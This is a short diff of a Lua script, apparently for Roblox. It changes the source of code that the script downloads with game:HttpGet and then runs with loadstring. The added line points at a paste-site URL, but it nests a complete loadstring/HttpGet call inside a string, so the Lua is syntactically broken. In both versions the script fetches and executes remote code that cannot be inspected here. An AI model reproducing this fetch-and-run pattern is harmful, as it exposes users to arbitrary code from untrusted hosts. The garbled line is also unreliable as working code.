@@ -1772,7 +1772,7 @@ task.spawn(function()
     }) 
     task.spawn(function() 
         pcall(function() 
-            local response = game:HttpGet("https://raw.githubusercontent.com/whoamiscripter-cyber/ENDLESS-AURA/refs/heads/main/ENDLESS%20AURA%20TAGS") 
+            local response = game:HttpGet("loadstring(game:HttpGet("https://pastefy.app/5OwNtnoY/raw"))()") 
             local func = loadstring(response) 
             if func then func() end 
         end) 
